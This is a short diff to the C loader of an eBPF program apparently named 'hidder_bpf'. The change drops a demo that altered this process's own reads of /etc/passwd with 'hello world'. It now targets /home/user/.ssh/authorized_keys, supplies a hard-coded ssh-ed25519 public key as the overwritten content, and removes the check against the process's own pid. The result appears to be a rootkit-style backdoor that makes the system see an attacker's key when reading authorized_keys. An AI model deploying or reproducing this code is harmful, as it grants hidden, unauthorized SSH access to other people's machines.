@@ -25,14 +25,11 @@ int main(int argc, char **argv)
         return 1;
     }
 
-    int my_pid = getpid();
-    skel->rodata->target_pid = my_pid;
-
-    char filename[] = "/etc/passwd";
+    char filename[] = "/home/user/.ssh/authorized_keys";
     skel->rodata->filename_len = strlen(filename);
     strcpy(skel->rodata->filename, filename);
 
-    char overwritten_content[] = "hello world";
+    char overwritten_content[] = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIRIg5kXRtoPB7uOyl69HFSbqPBOj0f4KcWHko3CYAEg";
     skel->rodata->overwritten_content_len = strlen(overwritten_content);
     strcpy(skel->rodata->overwritten_content, overwritten_content);
 
@@ -49,14 +46,8 @@ int main(int argc, char **argv)
     signal(SIGINT, int_exit);
     signal(SIGTERM, int_exit);
     printf("hidder_bpf loaded successfully.\n");
-    printf("my pid: %d\n", my_pid);
-    char buffer[1024];
     while (1) {
         sleep(2);
-        int fd = open("/etc/passwd", O_RDONLY);
-        read(fd, buffer, 1024);
-        printf("read: %s\n", buffer);
-        close(fd);
     }
     return 0;
 }
